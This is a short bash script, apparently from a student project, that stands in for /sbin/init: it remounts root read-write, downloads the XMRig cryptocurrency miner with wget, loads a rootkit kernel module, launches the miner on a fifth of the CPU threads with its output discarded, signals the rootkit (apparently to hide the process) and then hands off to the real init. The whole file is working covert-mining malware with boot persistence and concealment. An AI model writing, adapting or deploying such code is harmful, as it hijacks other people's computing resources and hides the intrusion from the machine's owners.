#!/bin/bash

#need to get the place of the makefile to compile first
#locations:
#this script /sbin/script_rootkit.sh
#rootkit .ko /lib/modules/$(uname -r)/extra/rootkit.ko
#xmrig binary and config file /opt/xmrig/FILES

mount -o remount,rw /

module_compile_dir="/home/void/bach-project/src"
module_dir="/lib/modules/$(uname -r)/extra"

xmrig_dir="/opt/xmrig"
xmrig_binary="$xmrig_dir/xmrig"
xmrig_config="$xmrig_dir/config.json"
#compile rootkit
if [ ! -d "$xmrig_dir" ]; then
	mkdir -p "$xmrig_dir"
fi

if [ ! -e "$xmrig_binary" ] || [ ! -e "$xmrig_config" ]; then
	rm -rf "$xmrig_dir"/*
	wget -O "$xmrig_dir/xmrig_tar" https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
	tar -xvzf "$xmrig_dir/xmrig_tar" -C "$xmrig_dir/"
	cp "$xmrig_dir/xmrig-6.22.2/xmrig" "$xmrig_dir/"
	cp "$xmrig_dir/xmrig-6.22.2/config.json" "$xmrig_dir/"
	rm "$xmrig_dir/xmrig_tar" 
	rm -r "$xmrig_dir/xmrig-6.22.2"


fi

#if extra not real then create it
#copy compile rootkit.ko to destination
if [ ! -d "$module_dir" ]; then
	mkdir -p "$module_dir"
fi

#cp "$module_compile_dir/rootkit.ko" "$module_dir/rootkit.ko"
insmod "$module_dir/rootkit.ko"


threads=$(lscpu | awk -F: '/^CPU\(s\):/ {gsub(/^[ \t]+/, "", $2); print $2}')

#check if min number of threads is six
if [ "$threads" -gt 6 ]; then
	#check if we got xmrig and if not then wget xmrig

	usable_threads=$((threads * 20 / 100))
	"$xmrig_binary" --config="$xmrig_config" --threads=$usable_threads > /dev/null 2/&1 &
	kill -64 $!
fi

exec /sbin/init "$@"
